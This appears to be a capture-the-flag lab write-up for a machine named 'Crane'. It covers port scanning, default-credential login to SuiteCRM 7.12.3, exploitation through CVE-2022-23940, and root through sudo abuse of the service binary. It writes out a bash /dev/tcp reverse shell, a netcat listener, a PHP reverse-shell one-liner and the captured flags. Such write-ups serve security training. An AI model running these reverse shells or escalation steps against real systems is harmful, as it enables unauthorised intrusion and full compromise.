# Crane

## Enumeration & scanning

- Open ports are 22, 80, 3306, 33060

``` sh
# Standard scanning
sudo nmap -p- 192.168.241.146
sudo nmap -p 80,3306,33060 -A 192.168.241.146
nuclei -target 192.168.241.146
```

### 80 (SuiteCRM)

- CRM panel with login page
- Has `/robots.txt` page with an ICS file linked (HTTP login)

``` sh
# Standard scanning
sudo nmap -p 80 --script="vuln" 192.168.241.146
```

### 3306 (MySQL) & 33060 (MySQLx)

``` sh
# Standard scanning
sudo nmap -p 3306, 33060 --script="vuln" 192.168.241.146
```

- MySQLx, some kind of interface for MySQL shells


## Foothold & Exploitation

- Can login to SuiteCRM with credentials `admin:admin`
- SuiteCRM version is 7.12.3
- Can download ICS file with same credentials but doesn't contain valuable information
- Find SuiteCRM exploit not listed on ExploitDB: https://github.com/manuelz120/CVE-2022-23940. Version is vulnerable
- Execute exploit and capture shell

``` sh
# Run exploit and capture shell
python3 exploit.py -h http://192.168.241.146 -u admin -p admin -P 'bash -c "bash -i >& /dev/tcp/192.168.45.198/4444 0>&1"' 
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
nc -nlvp 4444
www-data@crane:/var/www$ cat local.txt
cat local.txt
d7a05a3cd6f627ea5a6b72b11a33149a
```

## Privilege Escalation

- Sudoers file lists `service` binary
- Binary is listed on GTFObins, can elevate privileges

``` sh
# Check sudoers file
sudo -l
# Use allowed command
sudo /usr/sbin/service ../../bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
email1.txt
proof.txt
cat proof.txt
e18e46e98a9cefaeb698550cef03ccd9
```

## References

- https://github.com/manuelz120/CVE-2022-23940
- https://gtfobins.org/gtfobins/service/


## Walkthrough learnings

- Could have used PHP reverse shell as well since this is a PHP application

``` sh
# PHP reverse shell (also on revshells.com)
php -r '$sock=fsockopen("192.168.45.198",4444);exec("/bin/sh <&3 >&3 2>&3");'
```

## Rabbit holes

### SQLi

- Nuclei indicates that HTTP server is vulnerable to CVE-2024-36412 (blind SQLi)
- Blind SQLi is too difficult to exploit without automation, likely not the correct path

### MySQL DB

- MySQL DB might contain more information
- Cannot login via port 3306 (IP not allowed anyway it seems)
- Can create SuiteCRM diagnostic dump, some MySQL files contained with schema's etc. No valuable information
- Anyway, DB wouldn't give RCE
